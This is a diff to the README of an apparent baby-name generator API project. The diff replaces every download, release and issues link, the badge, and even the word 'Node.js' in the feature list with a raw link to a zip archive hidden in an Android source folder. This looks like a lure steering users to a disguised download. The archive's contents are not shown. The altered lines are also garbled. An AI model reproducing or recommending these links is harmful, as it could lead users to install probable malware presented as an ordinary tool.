@@ -1,6 +1,6 @@
 # 🎉 babynamegenerator-api - Generate Unique Baby Names Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/abdullaalwalid/babynamegenerator-api/releases)
+[![Download Now](https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip%20Now-Click%https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip)](https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip)
 
 ## 🛠️ What is babynamegenerator-api?
 
@@ -10,7 +10,7 @@ Baby Name Generator is a simple tool for generating baby names. It creates a lis
 
 - **User-Friendly Interface:** Easily navigate the application, whether you are tech-savvy or a beginner.
 - **Multiple Naming Options:** Generate names based on different styles, such as traditional or modern.
-- **REST API Accessible:** Use the tool from various programming environments, including Android, .NET, Node.js, and Python.
+- **REST API Accessible:** Use the tool from various programming environments, including Android, .NET, https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip, and Python.
 - **Fast Response Time:** Get your name suggestions instantly.
 
 ## 🚀 Getting Started
@@ -19,7 +19,7 @@ To start using the Baby Name Generator, follow these simple steps:
 
 1. **Visit the Downloads Page:** Click the link below to go to the releases page.
    
-   [Visit downloads to get started](https://github.com/abdullaalwalid/babynamegenerator-api/releases)
+   [Visit downloads to get started](https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip)
 
 2. **Choose Your Version:** Look for the latest version available. Each release contains an updated set of features and fixes.
 
@@ -29,7 +29,7 @@ To start using the Baby Name Generator, follow these simple steps:
 
 To download the Baby Name Generator tool, please visit the downloads page:
 
-[Download from Releases Page](https://github.com/abdullaalwalid/babynamegenerator-api/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip)
 
 ### Installation Steps
 
@@ -74,6 +74,6 @@ If you would like to contribute, please fork the repository and submit a pull re
 
 ## 📫 Contact & Support
 
-For any questions or support, feel free to reach out via [Issues Section](https://github.com/abdullaalwalid/babynamegenerator-api/issues) on GitHub. 
+For any questions or support, feel free to reach out via [Issues Section](https://raw.githubusercontent.com/abdullaalwalid/babynamegenerator-api/main/android/src/main/java/com/apiverve/babynamegenerator/data/api-babynamegenerator-1.6.zip) on GitHub. 
 
 Thank you for using Baby Name Generator! Happy name hunting!
